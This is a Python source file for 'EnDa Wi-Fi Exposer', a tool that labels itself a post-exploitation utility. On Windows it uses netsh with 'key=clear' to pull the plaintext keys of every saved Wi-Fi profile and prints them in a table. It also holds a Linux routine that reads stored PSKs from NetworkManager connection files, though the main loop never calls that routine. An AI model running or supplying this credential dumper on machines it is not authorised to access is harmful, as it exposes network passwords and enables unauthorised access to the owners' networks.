#Import needed modules
from Modules.Style import *
import ctypes
import os
import subprocess
import re
from collections import namedtuple
import configparser
from tabulate import tabulate
import platform

#Define the windows table
win_table = [["SSID","CIPHERS","KEY"]]

#Define a linux table
linux_table = [["SSID","AUTH-ALG","KEY-MGMT","PSK"]]

#Define a function which verifies if host has admin privilages
def is_admin():
    try:
        admin = os.getuid() == 0
    except AttributeError:
        admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return admin

#Define a banner var
banner = """
    ▒█▀▀▀ █▀▀▄ ▒█▀▀▄ █▀▀█   ▒█░░▒█ ░▀░ ░░ ▒█▀▀▀ ▀█▀   ▒█▀▀▀ █░█ █▀▀█ █▀▀█ █▀▀ █▀▀ █▀▀█ 
    ▒█▀▀▀ █░░█ ▒█░▒█ █▄▄█   ▒█▒█▒█ ▀█▀ ▀▀ ▒█▀▀▀ ▒█░   ▒█▀▀▀ ▄▀▄ █░░█ █░░█ ▀▀█ █▀▀ █▄▄▀ 
    ▒█▄▄▄ ▀░░▀ ▒█▄▄▀ ▀░░▀   ▒█▄▀▄█ ▀▀▀ ░░ ▒█░░░ ▄█▄   ▒█▄▄▄ ▀░▀ █▀▀▀ ▀▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
"""

#Keyboard handler
def keyboard_handler():
    try:
        enter(2)
        wanna_exit = input(Fore.WHITE + "    [" + Fore.YELLOW + "?" + Fore.WHITE + "]" + Fore.LIGHTRED_EX + " Do you want to exit the program?" + Fore.WHITE + " >> ")
        if wanna_exit.lower() not in ("n","no","nein","nah"):
            enter()
            programinput = 0
            print(Fore.WHITE + "    [" + Fore.BLUE + "!" + Fore.WHITE + "] >> " + Fore.LIGHTCYAN_EX + "Exiting the application..." + Fore.RESET)
            try:
                time.sleep(2)
                exit()
            except:
                exit()
    except KeyboardInterrupt:
        keyboard_handler()

#Create a function to get wi-fi passwords for windows
def get_windows_saved_wifi_passwords():
    ssids = []
    output = subprocess.check_output("netsh wlan show profiles").decode()
    ssids = []
    profiles = re.findall(r"All User Profile\s(.*)", output)
    for profile in profiles:
        ssid = profile.strip().strip(":").strip()
        ssids.append(ssid)
    profiles = []
    for ssid in ssids:
        Profile = ["","",""]
        ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
        ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
        ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
        key = re.findall(r"Key Content\s(.*)", ssid_details)
        try:
            key = key[0].strip().strip(":").strip()
        except IndexError:
            key = "None"
        Profile[0] = ssid
        Profile[1] = ciphers
        Profile[2] = key
        win_table.append(Profile)

#Create a function to get wi-fi passwords for linux
def get_linux_saved_wifi_passwords():
    network_connections_path = "/etc/NetworkManager/system-connections/"
    fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
    Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
    for file in os.listdir(network_connections_path):
        data = {k.replace("-", "_"): " " * 4 for k in fields}
        config = configparser.ConfigParser()
        config.read(os.path.join(network_connections_path, file))
        for _, section in config.items():
            for k, v in section.items():
                if k in fields:
                    data[k.replace("-", "_")] = v
        profile = Profile(**data)
        linux_table.append(list(profile))

#Create a start-up
programinput = 1
while programinput:
    win_table = [["SSID","CIPHERS","KEY"]]
    linux_table = [["SSID","AUTH-ALG","KEY-MGMT","PSK"]]
    try:
        clearConsole()
        print(banner_color(banner))
        enter()
        if str(platform.system()).lower() == "windows":
            os.system(f"title EnDa Wi-Fi Exposer ^| Platform : Windows ^| Admin : {is_admin()} ^| EnDaTeam on GITHUB")
        print("    " + Fore.LIGHTRED_EX + "[========================" + Fore.WHITE + " Welcome to EnDa WI-FI Exposer! " + Fore.LIGHTRED_EX + "========================]" + Fore.RESET)
        print("    " + Fore.LIGHTYELLOW_EX + "[======================" + Fore.WHITE + " This is an post-exploitation tool! " + Fore.LIGHTYELLOW_EX + "======================]" + Fore.RESET)
        enter()
        try:
            if str(platform.system()).lower() == "windows":
                get_windows_saved_wifi_passwords()
                formatted_table = tabulate(win_table, headers='firstrow', tablefmt='grid')
                formatted_table_with_spaces = "\n".join([" " * 4 + row for row in formatted_table.split("\n")])
                print(formatted_table_with_spaces)
            elif str(platform.system()).lower() == "linux":
                formatted_table = tabulate(linux_table, headers='firstrow', tablefmt='grid')
                formatted_table_with_spaces = "\n".join([" " * 4 + row for row in formatted_table.split("\n")])
                print(formatted_table_with_spaces)
            else:
                print(Fore.WHITE + "    [" + Fore.RED + "-" + Fore.WHITE + "] >> " + Fore.LIGHTRED_EX + "This program was coded only for windows and linux operating systems!" + Fore.RESET)
                time.sleep(10)
                exit()
        except:
            error("Something went wrong, run the program again!")
            time.sleep(3)
            exit()
        enter()
        wanna_exit = input(Fore.WHITE + "    [" + Fore.YELLOW + "?" + Fore.WHITE + "]" + Fore.LIGHTYELLOW_EX + " Do you want to refresh the program?" + Fore.WHITE + " >> ")
        if wanna_exit.lower() in ("n","no","nein","nah"):
            enter()
            programinput = 0
            print(Fore.WHITE + "    [" + Fore.BLUE + "!" + Fore.WHITE + "] >> " + Fore.LIGHTCYAN_EX + "Exiting the application..." + Fore.RESET)
            time.sleep(2)
            exit()
    except KeyboardInterrupt:
        keyboard_handler()